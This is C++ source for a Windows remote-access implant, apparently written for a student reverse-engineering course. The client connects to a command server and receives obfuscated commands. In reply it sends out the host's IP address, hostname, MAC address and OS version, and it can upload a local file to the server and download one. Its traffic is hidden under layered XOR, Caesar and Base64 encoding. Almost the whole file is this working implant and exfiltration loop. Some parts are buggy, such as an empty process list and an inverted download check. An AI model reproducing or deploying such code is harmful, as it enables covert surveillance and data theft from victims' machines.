#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <iostream>
#include <fstream>
#include <string>
#include <winsock2.h>
#include <iostream>
#include <string>
#include <vector>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <IcmpAPI.h>
#include <functional>
#include <iomanip>
#include <sstream>
#include <Windows.h>
#include <VersionHelpers.h>
#include <Psapi.h>
#include <locale>
#include <tchar.h>
#include <algorithm>
#include <cctype>
#include <cmath>

#pragma comment(lib, "WS2_32")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

// Caesar Cipher
int caesar_shift = 3;

// XOR Encryption
std::string key1 = "csec476";
std::string key2 = "reversingproject";

// Base64 characters
static const std::string BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Encode functions ...
std::string xor_encrypt(const std::string& input, const std::string& key) {
    std::string output;
    output.resize(input.size());
    for (size_t i = 0; i < input.size(); ++i) {
        output[i] = input[i] ^ key[i % key.size()];
    }
    return output;
}

std::string caesar_encrypt(const std::string& input) {
    std::string output;
    output.resize(input.size());
    for (size_t i = 0; i < input.size(); ++i) {
        if (isalpha(input[i])) {
            int offset = isupper(input[i]) ? 'A' : 'a';
            output[i] = (input[i] - offset + caesar_shift) % 26 + offset;
        }
        else {
            output[i] = input[i];
        }
    }
    return output;
}

std::string caesar_decrypt(const std::string& input) {
    std::string output;
    output.resize(input.size());
    for (size_t i = 0; i < input.size(); ++i) {
        if (isalpha(input[i])) {
            int offset = isupper(input[i]) ? 'A' : 'a';
            output[i] = (input[i] - offset - caesar_shift + 26) % 26 + offset;
        }
        else {
            output[i] = input[i];
        }
    }
    return output;
}

std::string base64_encode(const std::string& input) {
    std::string output;
    int val = 0;
    int valb = -6;
    for (unsigned char c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            output.push_back(BASE64_CHARS[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) {
        output.push_back(BASE64_CHARS[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    while (output.size() % 4) {
        output.push_back('=');
    }
    return output;
}

std::string base64_decode(const std::string& input) {
    std::string output;
    std::vector<int> T(256, -1);
    for (size_t i = 0; i < BASE64_CHARS.size(); i++) {
        T[BASE64_CHARS[i]] = i;
    }

    int val = 0;
    int valb = -8;
    for (unsigned char c : input) {
        if (T[c] == -1) {
            break;
        }
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            output.push_back(static_cast<char>((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return output;
}

// Encode Decode Comb
std::string encrypt(const std::string& input) {
    // Step 1: XOR
    std::string xor_encrypted = xor_encrypt(input, key1);

    // Step 2: Caesar Cipher
    std::string caesar_encrypted = caesar_encrypt(xor_encrypted);

    // Step 3: Base64
    std::string base64_encoded = base64_encode(caesar_encrypted);

    // Step 4: XOR again
    std::string final_encrypted = xor_encrypt(base64_encoded, key2);

    return final_encrypted;
}

std::string decrypt(const std::string& input) {
    // Step 1: XOR
    std::string xor_decrypted = xor_encrypt(input, key2);

    // Step 2: Base64
    std::string base64_decoded = base64_decode(xor_decrypted);

    // Step 3: Caesar Cipher
    std::string caesar_decrypted = caesar_decrypt(base64_decoded);

    // Step 4: XOR again
    std::string final_decrypted = xor_encrypt(caesar_decrypted, key1);

    return final_decrypted;
}

using namespace std;

string upload(const string& filePath, int clientSocket)
{
    // Extract the file name from the file path
    size_t lastSlashIndex = filePath.find_last_of("/\\");
    string fileName = filePath.substr(lastSlashIndex + 1);
    cout << fileName << endl;

    // Open the file to be uploaded
    ifstream fileStream(filePath, ios::in | ios::binary);
    if (!fileStream) {
        cerr << "Error: could not open file " << filePath << endl;
        closesocket(clientSocket);
        WSACleanup();
        return "";
    }

    // Read the file into a string
    string fileData((istreambuf_iterator<char>(fileStream)), istreambuf_iterator<char>());

    return fileData;
}


string download(int clientSocket, const string& filePath) {
    // Send the file path to the server
    int result = send(clientSocket, filePath.c_str(), static_cast<int>(filePath.size() + 1), 0);
    if (result == SOCKET_ERROR) {
        cerr << "Error: send failed with error code " << WSAGetLastError() << endl;
        closesocket(clientSocket);
        WSACleanup();
        return "";
    }

    // Receive the file data from the server
    string fileData;
    const int bufferSize = 1024;
    char buffer[bufferSize];
    int bytesRead;
    do {
        bytesRead = recv(clientSocket, buffer, bufferSize, 0);
        if (bytesRead > 0) {
            fileData.append(buffer, bytesRead);
        }
    } while (bytesRead == bufferSize);

    return fileData;
}

void getComputerName() {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(hostname) / sizeof(char);

    if (GetComputerNameA(hostname, &size)) {
        cout << "Hostname: " << hostname << endl;
    }
    else {
        cout << "Could not get hostname, error: " << GetLastError << endl;
    }
}

string getIpAddress()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        cerr << "Failed to initialize Winsock" << endl;
        return "";
    }

    char hostname[NI_MAXHOST];
    if (gethostname(hostname, NI_MAXHOST) != 0)
    {
        cerr << "Failed to get hostname" << endl;
        return "";
    }

    addrinfo* result;
    addrinfo hints = {};
    hints.ai_family = AF_INET;

    if (getaddrinfo(hostname, NULL, &hints, &result) != 0)
    {
        cerr << "Failed to get address info, error code: " << WSAGetLastError() << endl;
        return "";
    }

    sockaddr_in* sockAddr = (sockaddr_in*)result->ai_addr;
    char buffer[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(sockAddr->sin_addr), buffer, INET_ADDRSTRLEN);

    freeaddrinfo(result);
    return buffer;
}

string getMacAddress()
{
    IP_ADAPTER_INFO adapterInfo[16];
    ULONG bufferSize = sizeof(adapterInfo);
    DWORD result = GetAdaptersInfo(adapterInfo, &bufferSize);
    if (result != ERROR_SUCCESS)
    {
        cerr << "Failed to get adapter info, error code: " << result << endl;
        return "";
    }

    PIP_ADAPTER_INFO adapter = adapterInfo;
    vector<unsigned char> macAddress;
    for (size_t i = 0; i < adapter->AddressLength; i++)
    {
        macAddress.push_back(adapter->Address[i]);
    }

    ostringstream oss;
    oss << hex << setfill('0');
    for (auto byte : macAddress)
    {
        oss << setw(2) << static_cast<int>(byte) << ":";
    }
    string macAddressStr = oss.str();
    macAddressStr.pop_back();

    return macAddressStr;
}

string getOS()
{
    if (IsWindows10OrGreater())
    {
        return "Windows 10";
    }
    else if (IsWindows8Point1OrGreater())
    {
        return "Windows 8.1";
    }
    else if (IsWindows8OrGreater())
    {
        return "Windows 8";
    }
    else if (IsWindows7OrGreater())
    {
        return "Windows 7";
    }
    else if (IsWindowsVistaOrGreater())
    {
        return "Windows Vista";
    }
    else if (IsWindowsServer())
    {
        return "Windows Server";
    }
    else if (IsWindowsXPOrGreater())
    {
        return "Windows XP";
    }
    else
    {
        return "Unknown OS";
    }
}

vector<wstring> getRunningProcesses()
{
    DWORD processes[1024];
    DWORD numProcesses;
    vector<wstring> processNames;

    if (!EnumProcesses(processes, sizeof(processes), &numProcesses))
    {
        return processNames;
    }

    numProcesses /= sizeof(DWORD);

    for (DWORD i = 0; i < numProcesses; i++)
    {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
        if (hProcess != NULL)
        {
            HMODULE hMod;
            DWORD cbNeeded;

            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
            {
                TCHAR szProcessName[MAX_PATH];

                if (GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR)))
                {
                    //processNames.push_back(str);
                    printf("error here @ 346");
                }
            }

            CloseHandle(hProcess);
        }
    }

    return processNames;
}


int main(int argc, char* arg[]) {

    //Setting up DLL

    SOCKET clientSocket;
    int port = 8080;
    WSADATA wsaData;
    int wsaerr;
    int resultInt;
    string serverAddress = "127.0.0.1";
    string uploadPath = "C:\\Users\\student\\Desktop\\example.txt";
    string downloadPath = "C:\\Users\\student\\Desktop\\downloaded.txt";

    WORD wVersionRequested = MAKEWORD(2, 2);
    wsaerr = WSAStartup(wVersionRequested, &wsaData);
    if (wsaerr != 0) {
        cout << "The Winsock dll was not found" << endl;
        return 0;
    }
    else {
        cout << "The Winsock dll was found!" << endl;
        cout << "The status" << wsaData.szSystemStatus << endl;
    }

    //Setting up the client socket

    clientSocket = INVALID_SOCKET;
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        cout << "Error at socket: " << WSAGetLastError() << endl;
        WSACleanup();
        return 0;
    }
    else {
        cout << "Socket() is working..." << endl;
    }

    //Connecting to the server
    sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    InetPton(AF_INET, _T("127.0.0.1"), &clientService.sin_addr.s_addr);
    clientService.sin_port = htons(port);
    if (connect(clientSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
        cout << "Error at connect(): Failed to connect" << endl;
        WSACleanup();
        return 0;
    }
    else {
        cout << "Client connection is working!" << endl;
        cout << "The client can now start to send and recieve data from the server..." << endl;

    }

    //Get command from the server
    //Commands:
    //  IPADDRESS
    //  USERNAME
    //  MACADDRESS
    //  OS VERSION
    //  RUNNING PROCESSES
    //  UPLOAD
    //  DOWNLOAD
    for (;;) {
        char buffer[200];
        
        //Receive command from server    
        int byteCount = recv(clientSocket, buffer, 200, 0);
        
        //Convert buffer to a readable string to compare inside the if statements
        //string str(buffer); // buffer is already a char array - will otherwise be encoded incorrectly
        printf("\nencrypted received command: %s\n", buffer);
        
        string decryptedBuff = decrypt(string(buffer));
        strncpy(buffer, decryptedBuff.c_str(), decryptedBuff.size());
        buffer[decryptedBuff.size()] = '\0';
        printf("\nreceived command: %s\n", buffer);

        if (byteCount > 0) {
            if (strstr(buffer, "IPADDRESS")) {
                //Send IP Address
                string ipAddress = getIpAddress();
                if (ipAddress != "") {
                    // const char* msg = ipAddress.c_str();
                    // int bytesSent = send(clientSocket, msg, strlen(msg), 0);
                    
                    // encode ip
                    string encryptedIpAddress = encrypt(ipAddress);
                    int bytesSent = send(clientSocket,encryptedIpAddress.c_str(), encryptedIpAddress.size(), 0);
                    
                    if (bytesSent == SOCKET_ERROR) {
                        cout << "Error at send(): " << WSAGetLastError() << endl;
                        WSACleanup();
                        return 0;
                    }
                    else {
                        cout << "Message sent to server: " << encryptedIpAddress << endl;
                    }
                }
            }
            else if (strstr(buffer, "USERNAME")) {
                //Send Hostname

                char hostname[MAX_COMPUTERNAME_LENGTH + 1];
                DWORD size = sizeof(hostname) / sizeof(char);

                if (GetComputerNameA(hostname, &size)) {
                    // cout << "Message sent to server: " << hostname << endl;
                    // send(clientSocket, hostname, strlen(hostname), 0);
                    
                    // encode hostname
                    string encryptedHostname = encrypt(string(hostname));
                    int bytesSent = send(clientSocket, encryptedHostname.c_str(), encryptedHostname.size(), 0);
                }
                else {
                    cout << "Could not send hostname. Error: " << GetLastError << endl;
                }
            }
            else if (strstr(buffer, "MACADDRESS")) {
                //Send MAC Address

                string MacAddress = getMacAddress();
                if (MacAddress != "") {
                    // const char* macmsg = MacAddress.c_str();
                    // int bytesSent = send(clientSocket, macmsg, strlen(macmsg), 0);
                    
                    // encode mac
                    string encryptedMacAddress = encrypt(MacAddress);
                    int bytesSent = send(clientSocket, encryptedMacAddress.c_str(), encryptedMacAddress.size(), 0);
                    
                    if (bytesSent == SOCKET_ERROR) {
                        cout << "Error at send(): " << WSAGetLastError() << endl;
                        WSACleanup();
                        return 0;
                    }
                    else {
                        cout << "Message sent to server: " << endl;// << macmsg << endl;
                    }
                }
            }
            else if (strstr(buffer, "OS VERSION")) {
                //Send OS Version

                string osMessage = getOS();
                // int bytesSent = send(clientSocket, osMessage.c_str(), osMessage.size() + 1, 0);
                
                // encode os
                string encryptedOsMessage = encrypt(osMessage);
                int bytesSent = send(clientSocket, encryptedOsMessage.c_str(), encryptedOsMessage.size() + 1, 0);
                
                if (bytesSent == SOCKET_ERROR) {
                    cout << "Error while sending OS: " << WSAGetLastError() << endl;
                }
                else {
                    cout << "Message sent to server: " << osMessage << endl;
                }
            }
            else if (strstr(buffer, "RUNNING PROCESSES")) {
                //Send Running Processes

                vector<wstring> processes = getRunningProcesses();
                string result = "Running processes: \n";
                for (const auto& process : processes) {
                    result += string(process.begin(), process.end()) + "\n";
                }

                // int bytesSent = send(clientSocket, result.c_str(), result.length(), 0);
                
                // encode running processes
                string encryptedResult = encrypt(result);
                int bytesSent = send(clientSocket, encryptedResult.c_str(), encryptedResult.length(), 0);
                
                if (bytesSent == SOCKET_ERROR) {
                    cout << "Error while sending running processes: " << WSAGetLastError() << endl;
                    WSACleanup();
                    return 0;
                }
            }
            else if (strstr(buffer, "UPLOAD")) {
                string fileData = upload(uploadPath, clientSocket);
                if (fileData.empty()) {
                    cerr << "Error: upload failed - file empty" << endl;
                    return 0;
                }
                else {
                    resultInt = send(clientSocket, fileData.c_str(), fileData.size(), 0);
                    if (resultInt == SOCKET_ERROR) {
                        cerr << "Error: send failed with error code " << WSAGetLastError() << endl;
                        closesocket(clientSocket);
                        WSACleanup();
                        return 0;
                    }
                    cout << "File uploaded successfully." << endl;
                }
            }
            else if (strstr(buffer, "DOWNLOAD")) {
                string fileData = download(clientSocket, downloadPath);
                if (!fileData.empty()) {
                    cout << "File did not download correctly" << endl;
                    cout << fileData << endl;
                    closesocket(clientSocket);
                    WSACleanup();
                    return 0;
                }
                else {
                    cout << "File downloaded successfully" << endl;
                }
            }
        }
        else {
            WSACleanup();
        }
    }
    //Close the socket
    system("pause");
    WSACleanup();
    return 0;
}
